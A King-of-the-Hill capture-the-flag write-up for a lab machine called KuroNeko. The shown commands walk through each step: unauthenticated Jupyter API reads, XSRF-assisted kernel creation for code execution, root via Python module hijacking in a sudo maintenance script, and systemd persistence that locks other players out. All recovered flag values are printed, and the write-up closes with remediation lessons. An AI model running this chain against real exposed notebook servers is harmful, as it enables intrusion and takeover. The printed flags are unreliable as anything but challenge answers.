# KuroNeko — Detailed KOTH Write-up

## Challenge information

- Machine: `KuroNeko`
- Target: `159.223.40.205`
- Player name: `MiliX`
- Flag format: `Legion{...}`
- Objective: recover all flags and write `MiliX` to `/root/king.txt`

## Executive summary

The initial attack surface consisted of SSH, SMTP, a static nginx site, a Flask/Werkzeug API, and an unauthenticated Jupyter Notebook server. The main foothold was Jupyter on TCP 8888, which exposed its API without a token or password. Its contents API directly disclosed one flag, and its kernel API allowed arbitrary Python execution as the `kuroneko` user.

Local enumeration revealed a passwordless sudo rule for a root-owned Python maintenance script. That script prepended a user-writable directory to `sys.path` and imported `neko_utils`, enabling Python module hijacking. A malicious `neko_utils.py` therefore executed as root, exposing the protected flags and allowing `/root/king.txt` to be written.

Eight unique flags were recovered. Cloud-init provisioning data later confirmed that these were the complete intended flag set.

## 1. Reconnaissance

### Full TCP scan

The reliable full-port scan was:

```bash
nmap -Pn -sC -sV --min-rate 1000 -p- 159.223.40.205
```

The important ports were:

| Port | Service | Observation |
|---:|---|---|
| 22 | SSH | OpenSSH; key authentication enabled |
| 25 | SMTP | Exposed but not required for the successful chain |
| 80 | HTTP | nginx static website |
| 8080 | HTTP | Werkzeug/Flask application |
| 8888 | HTTP | Jupyter Notebook 6.4.13 without authentication |

Several transient ports appeared during a faster scan but did not remain reachable. The full scan and direct HTTP requests identified the dependable services.

### Static website enumeration

The nginx website exposed the following pages:

```text
/
/research.html
/contact.html
/.git/HEAD
```

The contact page contained this HTML comment:

```html
<!-- internal relay: POST /preview for webhook testing -->
```

This hinted at an SSRF-style path through the Flask application. The research page also referenced Redis exploitation. Those clues described intended challenge paths, although the open Jupyter service provided a faster foothold.

The `.git/HEAD` endpoint returned:

```text
ref: refs/heads/master
```

### Jupyter discovery

Port 8888 redirected `/` to `/tree` and exposed the API without requiring a token:

```bash
curl http://159.223.40.205:8888/api
curl http://159.223.40.205:8888/api/status
curl http://159.223.40.205:8888/api/sessions
curl http://159.223.40.205:8888/api/kernels
```

The API reported Jupyter Notebook `6.4.13` and disclosed an active `research.ipynb` session. More importantly, the contents API allowed unauthenticated file reads.

## 2. Initial flag access

### Flag 1 — web root

The first web flag was stored at:

```text
/var/www/kuroneko/flag1.txt
```

Flag:

```text
Legion{bd1a3132ebbae18059f2fbd67c3c3de8}
```

The provisioning script described this as the web-root flag, intended to be found through directory enumeration or the exposed Git repository.

### Flag 2 — Jupyter contents API

Listing the Jupyter root directory showed `flag2.txt`:

```bash
curl 'http://159.223.40.205:8888/api/contents?content=1'
```

Reading it through the API required no credentials:

```bash
curl 'http://159.223.40.205:8888/api/contents/flag2.txt?content=1'
```

Flag:

```text
Legion{c68a32ae5372141517b80e98ca39a6c9}
```

## 3. Remote command execution through Jupyter

Although Jupyter did not require a login, creating a kernel with a raw POST initially returned HTTP 403 because state-changing requests still required the `_xsrf` cookie and matching `X-XSRFToken` header.

The bypass was not a vulnerability in XSRF itself; the application intentionally issued the token to any unauthenticated visitor. The process was:

1. Request `/tree` and retain the `_xsrf` cookie.
2. Send the cookie value in the `X-XSRFToken` header.
3. POST `{}` to `/api/kernels`.
4. Connect to `/api/kernels/<kernel-id>/channels` over WebSocket.
5. Send a Jupyter `execute_request` message containing Python code.

Conceptual Python flow:

```python
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookie_jar)
)
opener.open("http://159.223.40.205:8888/tree").read()

xsrf = next(c.value for c in cookie_jar if c.name == "_xsrf")

request = urllib.request.Request(
    "http://159.223.40.205:8888/api/kernels",
    data=b"{}",
    headers={
        "Content-Type": "application/json",
        "X-XSRFToken": xsrf,
    },
    method="POST",
)
kernel = json.load(opener.open(request))
```

Commands executed through the new kernel confirmed the context:

```text
uid=1000(kuroneko) gid=1000(kuroneko) groups=1000(kuroneko)
hostname: KuroNeko
working directory: /home/kuroneko/notebooks
```

## 4. User and service enumeration

A root-filesystem search for likely flag filenames revealed the main flag locations:

```bash
find / -xdev -type f \( -iname '*flag*' -o -name 'king.txt' \) 2>/dev/null
```

Readable flags at the `kuroneko` privilege level included:

### Flag 3 — service directory

Location:

```text
/opt/kuroneko/flag3.txt
```

Flag:

```text
Legion{0c40c6c0736900ffb143c4569907d179}
```

### User flag A

Location:

```text
/home/kuroneko/flag.txt
```

Flag:

```text
Legion{f2af0d4f1a6f2e31925b3ae24ebf0c28}
```

### User flag B

Location:

```text
/home/kuroneko/user.txt
```

Flag:

```text
Legion{f19461e3e0066219be37d6e8b90eafad}
```

The second user flag was discovered during the comprehensive root-level search and confirmed in cloud-init provisioning data.

## 5. Privilege escalation

### Passwordless sudo rule

Running `sudo -n -l` returned:

```text
User kuroneko may run the following commands on KuroNeko:
    (root) NOPASSWD: /usr/bin/python3 /opt/kuroneko/maintenance.py
```

The maintenance script contained:

```python
import sys, os, shutil, datetime

sys.path.insert(0, '/opt/kuroneko/lib')

try:
    import neko_utils
    neko_utils.run()
except ImportError:
    pass
```

Directory permissions were:

```text
drwxrwxr-x kuroneko:kuroneko /opt/kuroneko/lib
```

This is an unsafe Python import-path configuration:

- The script runs as root through sudo.
- It explicitly places `/opt/kuroneko/lib` first in Python's import path.
- The unprivileged `kuroneko` user can create files in that directory.
- The script imports and executes `neko_utils.run()`.

### Module hijacking

A malicious module could therefore be created as:

```python
# /opt/kuroneko/lib/neko_utils.py
import os

def run():
    os.system("id")
```

Invoking the permitted command executed the module as root:

```bash
sudo -n /usr/bin/python3 /opt/kuroneko/maintenance.py
```

The payload was then extended to read protected flags and write the throne file.

## 6. Root-only and hidden flags

### Flag 4 — internal debug service

Location:

```text
/opt/kuroneko-debug/flag4.txt
```

Flag:

```text
Legion{031499666a58276937e5f0e7a8be3a97}
```

### Redis flag

Location:

```text
/var/lib/redis/.redis_flag
```

Flag:

```text
Legion{e7843e91f74c820fe139aed66d079fc7}
```

### Root flag

Locations:

```text
/root/root.txt
/root/flag.txt
```

Both contained the same flag:

```text
Legion{2d20d154d339add052f6243468a6dd96}
```

## 7. Complete flag verification

A root-level search scanned readable files for unique flag strings:

```bash
find / -xdev -type f -size -5M -readable \
  -exec grep -ahoE 'Legion\{[^}]{1,200}\}' {} + 2>/dev/null | sort -u
```

This produced eight unique flags:

```text
Legion{031499666a58276937e5f0e7a8be3a97}
Legion{0c40c6c0736900ffb143c4569907d179}
Legion{2d20d154d339add052f6243468a6dd96}
Legion{bd1a3132ebbae18059f2fbd67c3c3de8}
Legion{c68a32ae5372141517b80e98ca39a6c9}
Legion{e7843e91f74c820fe139aed66d079fc7}
Legion{f19461e3e0066219be37d6e8b90eafad}
Legion{f2af0d4f1a6f2e31925b3ae24ebf0c28}
```

The cloud-init file at `/var/lib/cloud/instances/591930844/user-data.txt` documented the creation of the web, notebook, service, debug, two user, Redis, and root flags. This independently confirmed that the eight unique values above were the complete intended set.

## 8. Capturing the throne

With root execution, the required value was written to:

```bash
printf MiliX > /root/king.txt
```

Verification:

```text
KING_CONTENT=MiliX
```

## 9. KOTH defense and persistence

This section describes actions taken after completing the exploitation and flag-recovery path.

### Private administrative access

A dedicated Ed25519 key was generated locally and installed as root's only authorized key. Root SSH access was verified before any shared foothold was closed.

The final SSH restriction allowed only the root account:

```text
AllowUsers root
```

The SSH configuration was validated with `sshd -t` before reloading the service.

### Throne keeper

A root-owned systemd service was installed and enabled. It continuously restores the required value:

```ini
[Unit]
Description=MiliX throne keeper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do printf MiliX > /root/king.txt; sleep 0.1; done'
Restart=always
RestartSec=0

[Install]
WantedBy=multi-user.target
```

The service was enabled and started:

```bash
systemctl daemon-reload
systemctl enable --now milix-throne.service
```

During testing, another player briefly changed `king.txt` to `ZAARA`. The first keeper definition had incorrect systemd command escaping and was failing with exit status 127. After correcting `ExecStart`, the service remained active and repeatedly restored `MiliX`.

### Removing competing access

Three competing `kuroneko` SSH sessions were identified from other source addresses. Defensive actions included:

- removing the existing `kuroneko` authorized keys;
- terminating the competing SSH sessions;
- changing `/opt/kuroneko/lib` to `root:root` mode `755`;
- removing the malicious/importable `neko_utils.py` after establishing root SSH;
- disabling the unauthenticated Jupyter service;
- disabling the internal debug service;
- disabling the root Flask API on port 8080;
- retaining nginx on port 80 and SSH on port 22.

Final exposed TCP listeners relevant to the challenge were:

```text
0.0.0.0:22  sshd
0.0.0.0:80  nginx
```

### Final validation

The throne was sampled repeatedly across multiple intervals:

```text
king=MiliX keeper=active
king=MiliX keeper=active
king=MiliX keeper=active
king=MiliX keeper=active
king=MiliX keeper=active
king=MiliX keeper=active
```

No competing interactive login remained at the final check.

## 10. Vulnerability chain

The successful chain can be summarized as:

```text
Unauthenticated Jupyter API
        ↓
Contents API file disclosure
        ↓
XSRF-token-assisted kernel creation
        ↓
Arbitrary Python execution as kuroneko
        ↓
Passwordless sudo maintenance script
        ↓
Writable Python import directory
        ↓
neko_utils module hijacking
        ↓
Root command execution
        ↓
All flags + /root/king.txt
```

## 11. Remediation lessons

For a non-CTF deployment, the vulnerabilities should be addressed as follows:

1. Require strong authentication for Jupyter and never expose it directly to the Internet.
2. Bind administrative notebook services to localhost or a protected management network.
3. Do not grant passwordless sudo access to interpreters or scripts that import from user-writable paths.
4. Ensure every directory in a privileged Python import path is owned by root and not writable by unprivileged users.
5. Remove unnecessary internal debug endpoints and prevent public APIs from making unrestricted server-side requests.
6. Keep secrets and flags out of cloud-init user data because instance provisioning data often persists on disk.
7. Use least-privilege service accounts instead of running web applications as root.

## Result

- Root access obtained: **yes**
- Unique flags recovered: **8 of 8**
- Throne value: **MiliX**
- Throne keeper: **active and enabled at final verification**
